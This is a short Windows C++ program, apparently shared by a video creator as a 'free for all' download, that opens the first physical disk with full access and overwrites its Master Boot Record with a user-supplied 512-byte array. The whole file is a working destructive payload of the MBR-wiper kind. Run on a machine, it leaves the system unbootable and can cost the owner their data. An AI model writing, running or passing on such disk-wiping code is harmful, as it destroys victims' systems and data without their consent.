//Free for all ;)
//Subscribe to my channel for more things of this :D

#include <windows.h>

// Edit 07/02/2020, chaneged the name file to "Soucre", and added the cpp extension.

const unsigned char MasterBootRecord[] = {}; //here enter you Hexadecimal code in midle of {};

int CALLBACK WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine, int       nCmdShow
)
{
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}
